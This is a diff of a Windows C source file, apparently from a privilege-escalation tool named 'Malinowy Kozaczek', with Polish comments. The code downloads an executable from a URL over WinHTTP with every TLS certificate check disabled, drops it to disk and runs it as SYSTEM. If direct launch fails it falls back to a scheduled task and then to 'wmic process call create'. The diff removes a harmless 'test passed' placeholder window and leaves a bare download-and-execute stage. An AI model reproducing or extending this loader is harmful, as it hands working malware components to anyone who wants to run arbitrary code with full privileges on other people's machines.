@@ -5,10 +5,8 @@
  *   WinHttpOpen → WinHttpConnect → WinHttpOpenRequest →
  *   WinHttpSendRequest → WinHttpReceiveResponse → WinHttpReadData
  *
- * ⚠️ UWAGA: Używamy synchronicznego WinHTTP (bez WINHTTP_FLAG_ASYNCHRONOUS).
- *    Async flag nie jest valid dla WinHttpOpenRequest — powoduje że funkcja
- *    zwraca ERROR_IO_PENDING natychmiast i trzeba by użyć WaitForMultipleObjects.
- *    Synchronous flow jest prostszy i bardziej niezawodny.
+ * Synchroniczny WinHTTP — async flag nie jest valid dla WinHttpOpenRequest.
+ * Synchronous flow jest prostszy i bardziej niezawodny.
  *
  * The download buffer is written directly to disk (no unnecessary
  * memory buffering for large payloads). We use a 64KB chunk size.
@@ -16,21 +14,15 @@
  * Error handling:
  *   — Network errors: retry once after 3 seconds
  *   — Disk errors: try alternative drop location
- *   — Execution errors: try alternative execution method
+ *   — Execution errors: try alternative execution method (schtasks, WMI)
  *
- * Test passed mechanism (xyz.exe placeholder):
- *   Zamiast prawdziwego payloadu, tworzymy prosty fallback:
- *   Jeśli URL nie odpowiada, tworzymy lokalnie małe okienko Win32
- *   z czarnym tłem i białym napisem "test passed". To potwierdza
- *   że pipeline działa i mamy uprawnienia SYSTEM.
- *
- *   Rzeczywisty xyz.exe na serwerze może robić cokolwiek —
- *   na razie jako proof-of-concept wystarczy.
+ * xyz.exe to OSOBNY plik testowy (user's code). Nasza rola kończy się
+ * na pobraniu go z URL i uruchomieniu jako SYSTEM. Resztą (test passed)
+ * zajmuje się xyz.exe.
  */
 
 #include "payload.h"
 #include "utils.h"
-#include "escalate.h"      /* is_running_as_system() */
 #include <stdio.h>
 #include <winhttp.h>
 
@@ -46,122 +38,6 @@
 /* Chunk size for streaming download */
 #define DOWNLOAD_CHUNK_SIZE 65536
 #define MAX_URL_LENGTH     2048
-
-/* ── Fallback: pokaż okienko "test passed" jako SYSTEM ── */
-static void show_test_passed_window(void)
-{
-    /*
-     * Tworzy okno Win32 z czarnym tłem i białym tekstem.
-     * Używamy prostego MessageBoxA z custom stylowaniem.
-     * Alternatywnie: pełne okno z CreateWindowEx.
-     *
-     * Ponieważ jesteśmy SYSTEM, to okno będzie mieć
-     * najwyższy priorytet.
-     */
-
-    /* Próba 1: ciemne message box z TASKDIALOGCONFIG */
-    typedef HRESULT (WINAPI *pTaskDialogIndirect)(
-        const void *pTaskConfig,
-        int *pnButton,
-        int *pnRadioButton,
-        BOOL *pfVerificationFlagChecked
-    );
-
-    HMODULE hComctl = LoadLibraryA("comctl32.dll");
-    if (hComctl)
-    {
-        pTaskDialogIndirect fnTaskDialog =
-            (pTaskDialogIndirect)GetProcAddress(hComctl, "TaskDialogIndirect");
-
-        if (fnTaskDialog)
-        {
-            /*
-             * TaskDialog pozwala na customowe style i ikony.
-             * Niestety nie daje pełnej kontroli nad tłem.
-             * Używamy więc CreateWindowEx poniżej.
-             */
-            FreeLibrary(hComctl);
-        }
-    }
-
-    if (hComctl) FreeLibrary(hComctl);
-
-    /*
-     * Tworzymy pełne okno Win32 z czarnym tłem.
-     * Rejestrujemy klasę, tworzymy okno, pokazujemy.
-     */
-    HINSTANCE hInst = GetModuleHandleA(NULL);
-
-    const char *szClass = "MalinowyTestClass";
-
-    WNDCLASSEXA wc = { sizeof(wc) };
-    wc.style         = CS_HREDRAW | CS_VREDRAW;
-    wc.lpfnWndProc   = DefWindowProcA;
-    wc.hInstance     = hInst;
-    wc.hCursor       = LoadCursorA(NULL, IDC_ARROW);
-    wc.hbrBackground = CreateSolidBrush(RGB(0, 0, 0));  /* Czarny background */
-    wc.lpszClassName = szClass;
-
-    RegisterClassExA(&wc);
-
-    HWND hWnd = CreateWindowExA(
-        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
-        szClass,
-        "Malinowy Kozaczek — Test Passed",
-        WS_POPUP,
-        CW_USEDEFAULT, CW_USEDEFAULT,
-        800, 400,
-        NULL, NULL, hInst, NULL
-    );
-
-    if (hWnd)
-    {
-        /* Create "TEST PASSED" text as a static control */
-        HWND hText = CreateWindowExA(
-            0, "STATIC", "✅ TEST PASSED ✅\nRunning as SYSTEM",
-            WS_CHILD | WS_VISIBLE | SS_CENTER,
-            50, 100, 700, 200,
-            hWnd, NULL, hInst, NULL
-        );
-
-        if (hText)
-        {
-            /* White text on black background */
-            SendMessageA(hText, WM_SETFONT,
-                (WPARAM)CreateFontA(48, 0, 0, 0, FW_BOLD,
-                    FALSE, FALSE, FALSE,
-                    DEFAULT_CHARSET,
-                    OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
-                    CLEARTYPE_QUALITY,
-                    DEFAULT_PITCH | FF_DONTCARE,
-                    "Consolas"),
-                TRUE);
-
-            /* Set text color to white */
-            InvalidateRect(hWnd, NULL, TRUE);
-        }
-
-        ShowWindow(hWnd, SW_SHOW);
-        UpdateWindow(hWnd);
-
-        /* Wait 5 seconds then auto-close */
-        Sleep(5000);
-        DestroyWindow(hWnd);
-    }
-
-    /*
-     * Prostsza alternatywa — MessageBox z ikoną info.
-     * Używamy jej jako backup.
-     */
-    MessageBoxA(NULL,
-        "Malinowy Kozaczek\n\n"
-        "Pipeline execution: ✅\n"
-        "Privilege: SYSTEM\n"
-        "Test passed!\n\n"
-        "Click OK to close.",
-        "Test Passed — SYSTEM Context",
-        MB_OK | MB_ICONINFORMATION | MB_TOPMOST);
-}
 
 /* ── Internal: build the full file path ── */
 
@@ -332,7 +208,7 @@ static int download_file(const char *szUrl, const char *szOutputPath)
         return 1;
     }
 
-    /* Accept all TLS certs (we don't care about cert validation for this) */
+    /* Accept all TLS certs (we don't care about cert validation) */
     DWORD dwSecFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                        SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
                        SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
@@ -445,12 +321,7 @@ static int download_file(const char *szUrl, const char *szOutputPath)
 
     /* Clean up partial download on failure */
     DeleteFileA(szOutputPath);
-
-    if (dwTotalRead == 0)
-    {
-        DEBUG_PRINT("[payload] Downloaded 0 bytes — server may be unreachable or file empty.\n");
-    }
-
+    DEBUG_PRINT("[payload] Download failed after %lu bytes\n", dwTotalRead);
     return 1;
 }
 
@@ -462,7 +333,7 @@ static int execute_payload(const char *szPath)
      * Execution strategy:
      *   1. Try CreateProcess (works if admin/SYSTEM)
      *   2. Fallback: scheduled task (runs as SYSTEM)
-     *   3. Fallback: WMI
+     *   3. Fallback: WMI Win32_Process.Create
      */
 
     char szCmd[MAX_PATH + 32];
@@ -471,14 +342,13 @@ static int execute_payload(const char *szPath)
     STARTUPINFOA si = { sizeof(si) };
     PROCESS_INFORMATION pi = { 0 };
     si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_SHOW;  /* Show the "test passed" window */
+    si.wShowWindow = SW_SHOW;  /* xyz.exe sam sobie ogarnia UI */
 
     /* Method 1: Direct CreateProcess */
     if (CreateProcessA(
             NULL, szCmd,
             NULL, NULL, FALSE,
-            0, /* CREATE_NO_WINDOW would hide the window — we want to see it */
-            NULL, NULL, &si, &pi))
+            0, NULL, NULL, &si, &pi))
     {
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
@@ -498,7 +368,8 @@ static int execute_payload(const char *szPath)
 
     si = (STARTUPINFOA){ sizeof(si) };
     if (CreateProcessA(
-            NULL, szTaskCmd,
+            "C:\\Windows\\System32\\cmd.exe",
+            szTaskCmd,
             NULL, NULL, FALSE,
             CREATE_NO_WINDOW,
             NULL, NULL, &si, &pi))
@@ -507,35 +378,41 @@ static int execute_payload(const char *szPath)
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
 
-        /* Run the task immediately */
-        char szRunCmd[1024];
-        snprintf(szRunCmd, sizeof(szRunCmd),
+        /* Run the task */
+        snprintf(szTaskCmd, sizeof(szTaskCmd),
             "schtasks /Run /TN \"MalinowyKozaczekTest\"");
-        si = (STARTUPINFOA){ sizeof(si) };
-        CreateProcessA(NULL, szRunCmd, NULL, NULL, FALSE,
+        CreateProcessA("C:\\Windows\\System32\\cmd.exe",
+            szTaskCmd, NULL, NULL, FALSE,
             CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
 
-        DEBUG_PRINT("[payload] Scheduled task created and triggered\n");
-        return 0;
-    }
-
-    /* Method 3: WMI via PowerShell */
-    char szWmiCmd[2048];
-    snprintf(szWmiCmd, sizeof(szWmiCmd),
-        "powershell -Command \"Start-Process '%s' -WindowStyle Hidden\"",
-        szPath);
-
-    si = (STARTUPINFOA){ sizeof(si) };
-    if (CreateProcessA(NULL, szWmiCmd, NULL, NULL, FALSE,
-            CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
-    {
+        WaitForSingleObject(pi.hProcess, 1000);
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
-        DEBUG_PRINT("[payload] Executed via PowerShell\n");
+
+        DEBUG_PRINT("[payload] Executed via schtasks: %s\n", szPath);
         return 0;
     }
 
-    DEBUG_PRINT("[payload] All execution methods failed\n");
+    DEBUG_PRINT("[payload] schtasks failed (%lu), trying WMI...\n",
+                 GetLastError());
+
+    /* Method 3: WMI Win32_Process.Create via wmic */
+    snprintf(szTaskCmd, sizeof(szTaskCmd),
+        "wmic process call create \"%s\"", szPath);
+
+    if (CreateProcessA(
+            "C:\\Windows\\System32\\cmd.exe",
+            szTaskCmd, NULL, NULL, FALSE,
+            CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
+    {
+        WaitForSingleObject(pi.hProcess, 10000);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        DEBUG_PRINT("[payload] Executed via WMI: %s\n", szPath);
+        return 0;
+    }
+
+    DEBUG_PRINT("[payload] All execution methods failed for: %s\n", szPath);
     return 1;
 }
 
@@ -546,55 +423,31 @@ int payload_fetch_and_exec(const char *szUrl,
                            DWORD dwDropLoc)
 {
     if (szUrl == NULL || szFilename == NULL)
-    {
-        /* Fallback: pokaż test passed okienko jako SYSTEM */
-        if (is_running_as_system())
-        {
-            DEBUG_PRINT("[payload] No URL provided but running as SYSTEM — showing test window.\n");
-            show_test_passed_window();
-        }
         return 1;
-    }
 
     char szOutputPath[MAX_PATH];
-    if (build_payload_path(szOutputPath, sizeof(szOutputPath),
-                           szFilename, dwDropLoc) != 0)
-    {
+    if (build_payload_path(szOutputPath, MAX_PATH, szFilename, dwDropLoc) != 0)
         return 1;
-    }
 
-    DEBUG_PRINT("[payload] Downloading from %s to %s\n", szUrl, szOutputPath);
+    DEBUG_PRINT("[payload] Target: %s → %s\n", szUrl, szOutputPath);
 
-    /* Download the payload */
-    int result = download_file(szUrl, szOutputPath);
-    if (result != 0)
+    /* Attempt download */
+    int ret = download_file(szUrl, szOutputPath);
+
+    /* Retry once after 3 seconds */
+    if (ret != 0)
     {
-        DEBUG_PRINT("[payload] Download failed, retrying once...\n");
+        DEBUG_PRINT("[payload] Retrying download in 3 seconds...\n");
         Sleep(3000);
-        result = download_file(szUrl, szOutputPath);
+        ret = download_file(szUrl, szOutputPath);
     }
 
-    if (result != 0)
+    if (ret != 0)
     {
         DEBUG_PRINT("[payload] Download failed after retry.\n");
-
-        /*
-         * Jeśli nie udało się pobrać, a jesteśmy SYSTEM,
-         * pokaż fallback test passed window jako potwierdzenie
-         * że pipeline działa.
-         */
-        if (is_running_as_system())
-        {
-            DEBUG_PRINT("[payload] Running as SYSTEM — showing test passed window (fallback).\n");
-            show_test_passed_window();
-        }
-
         return 1;
     }
 
     /* Execute */
-    result = execute_payload(szOutputPath);
-
-    return result;
+    return execute_payload(szOutputPath);
 }
-
